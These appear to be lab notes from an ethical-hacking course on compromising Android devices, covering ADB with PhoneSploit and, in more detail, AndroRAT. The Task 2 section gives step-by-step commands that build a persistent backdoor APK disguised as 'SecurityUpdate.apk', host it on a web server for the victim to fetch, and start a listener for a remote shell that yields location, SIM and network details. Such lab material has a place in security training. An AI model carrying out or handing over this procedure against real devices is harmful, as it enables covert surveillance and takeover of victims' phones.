Task 1: Exploit the Android Platform through ADB using PhoneSploit

Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device

  • Allows installing and debugging apps, and access to a Unix shell that you can use to run commands
  • Typically connect ADB using a USB, but can do so wirelessly by enabling daemon server at TCP port 5555 on device

Note: If you are unable to establish a connection with the target device, then press Ctrl+C and re-perform previous note.

Task 2: Hack an Android Device by Creating APK File using AndroRAT

AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it

  • Client/Server application (Java Android=Client side, Python=Server side)
  • Provides fully persistent backdoor - app startes automatically on device boot up
  • Obtains current location, sim card details, IP/MAC address of device

  1. Run cd AndroRAT command to navigate to the AndroRAT repository
  1. python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk command to create an APK file (here, SecurityUpdate.apk).
    1. -i specifies local IP
  1. You can observe that an APK file (SecurityUpdate.apk) is generated at the location /home/attacker/AndroRAT/.
  1. cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/ command to copy the SecurityUpdate.apk file to the location share folder
  1. Note: If the share folder does not exist, then execute the following commands to create a share folder and assign required permissions to it:
  1. ▪ Run mkdir /var/www/html/share to create a shared folder
  1. ▪ Run chmod -R 755 /var/www/html/share
  1. ▪ Run chown -R www-data:www-data /var/www/html/share
  1. service apache2 start
  1. python3 androRAT.py --shell -i 0.0.0.0 -p 4444 command to start listening to the victim's machine.

  1. In Android device
  1. In the address bar, type http://10.10.1.13/share and press Enter
